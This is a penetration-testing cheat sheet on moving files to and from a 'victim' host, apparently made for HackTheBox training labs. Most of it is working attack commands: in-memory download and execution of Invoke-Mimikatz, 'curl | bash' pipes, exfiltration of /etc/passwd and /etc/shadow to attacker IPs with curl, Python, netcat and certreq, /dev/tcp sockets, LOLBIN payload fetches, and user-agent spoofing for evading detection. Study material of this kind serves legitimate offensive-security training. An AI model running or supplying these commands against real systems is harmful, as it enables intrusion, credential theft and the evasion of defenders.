# File Transfers

Main idea:

- Need file onto victim? -> download
- Need file off victim? -> upload
- HTTP blocked? -> SMB/FTP
- Interactive shell bad? -> command file/base64
- PowerShell blocked? -> LOLBINs/programming languages
- Want stealth? -> fileless/IEX/user-agent tricks

# Download Operations

**From attacker to victim**

Typical order I'd try:

1. HTTP download
2. SMB
3. FTP
4. Base64 fallback

| Technique | Purpose |
| --- | --- |
| Base64 | transfer without network |
| PowerShell WebClient | HTTP download |
| SMB | internal file transfer |
| FTP | alternative transfer |
| WebDAV | SMB over HTTP |
| IEX | fileless execution |

## Base-64

In very restricted shells and small files

```bash
#encode on linux
cat id_rsa |base64 -w 0;echo

#check hashes
md5sum id_rsa

#decode on windows ps
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(""))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

```

## PowerShell Web Downloads

```bash
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

#fileless method (directly in memory without download) IMP!!
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

## SMB

Only use if SMB port is open

```bash
#create smb server on attacker
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

#to mount and use on ps:
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

## FTP

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

# Upload Operations

From victim to attacker 

## Base-64

```bash
#encode on ps
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

#decode on linux
echo <base64> | base64 -d -w 0 > hosts
```

## PS Web Upload

```bash
pip3 install uploadserver
python3 -m uploadserver

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

#use netcat to catch it
nc -lvnp 8000
```

## SMB

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

#to upload
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

## FTP

```bash
sudo python3 -m pyftpdlib --port 21 --write

#on ps
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

# LINUX FILE TRANSFERS

## Wget/Curl

Common utility using HTTP for file transfer

```bash
wget [link] -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh [link]
```

## Fileless

Use pipes to automatically load code/script without downloading

```bash
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Bash download

Use if none of the others work, since bash is already in all Linux 

```bash
#connect
exec 3<>/dev/tcp/10.10.10.32/80
#HTTP GET
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
#print response
cat <&3
```

## SCP

```bash
sudo systemctl enable ssh
sudo systemctl start ssh

scp file.txt user@remotehost:/remote/path/

```

## Web Upload

```bash
sudo python3 -m pip install --user uploadserver
#create cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

#webserver
 mkdir https && cd https
 sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Using python or php in case above does not work

```bash
#python depending on version
python3 -m http.server [port]
python2.7 -m SimpleHTTPServer

#php
php -S 0.0.0.0:8000

#ruby
ruby -run -ehttpd . -p8000

#uploading using scp:
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# Transferring files using programming languages

## Python

```bash
#####DOWNLOAD#####
#python 2
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

#python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

#####UPLOAD#####
python3 -m uploadserver #do this on your pc
#on victim
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## PHP

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

You can also pipe it with bash for fileless approach add | bash to end

## Ruby

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## Javascript

```bash
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

[https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) 

## VBScript

```bash
#use this for wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

#then execute this
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

# Other ways

## Netcat

Attacker listens and victim sends incase there is a firewall blocking inbound connections.

```bash
#on victim
nc attackip 8080 > filename

#on attacker
sudo nc -l -p 443 -q 0 < filename
```

## Ncat

Ncat is the improved version of nc, that supports IPV6 and SSL.

```bash
#victim
ncat attackip 443 --recv-only > filename

#attacker
sudo ncat -l -p 443 --send-only < filename
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

```bash
#on victim
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

#and ncat as normal on attacker
```

## PowerShell Session File Transfer

Used in case HTTP, HTTPS, or SMB are unavailable.

The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

**Requires administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration!!!!

```bash
#to confirm in PS
Test-NetConnection -ComputerName DATABASE01 -Port 5985

#create session
$Session = New-PSSession -ComputerName DATABASE01

#copy item from localhost (attacker) to victim DATABASE
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

#copy item from victim to attacker
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

```

## RDP

```bash
#mount a linux folder using rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

#mounting a linux folder using xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

# Encrypting data to transfer

On PS:

https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1

```bash
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

```

On linux:

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

#decryption
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                 
```

# Using Nginx to catch files over HTTP/S

Allows HTTP uploads (instead of the python upload server) and is an  alternative for transferring files to `Apache` .

Has the advantage that if you hit a directory without index.html, it will not list all files like Apache. 

```bash
#On attacker:
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
nano /etc/nginx/sites-available/upload.conf
#put this in upload.conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
#then
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
#start nginx
sudo systemctl restart nginx.service
#for errors check: /var/log/nginx/error.log

#ON VICITM:
#upload using CURL
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

# Using Linux/Windows binaries

## Windows

[https://lolbas-project.github.io/#](https://lolbas-project.github.io/#) 

Example using certreq.exe

```bash
#send the file to our Netcat session, and we can copy-paste its contents.
#on victim
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

#on attacker - use netcat to recieve
sudo nc -lvnp 8000

```

Using Bitsadmin

```bash
#file download on cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

#on PS
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

Using certutil

```bash
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe nc.exe
```

## Linux

https://gtfobins.github.io/

Example using OpenSSL

```bash
#on attacker
#create cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
#stand up server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

#on victim
#download file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

# Evading Detection

Malicious file transfers can also be detected by their user agents.

e.g. Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

in the HTTP header files, and unknown agent strings can be blocked. 

To change it (to evade detection):

```bash
#change
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
#invoke web request as normal
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

#on attacker listen
nc -lvnp 80
```

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. 

Using LOLBINs can help live off land and use built in applicaitons e.g. using **GfxDownloadWrapper.exe**

```bash
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
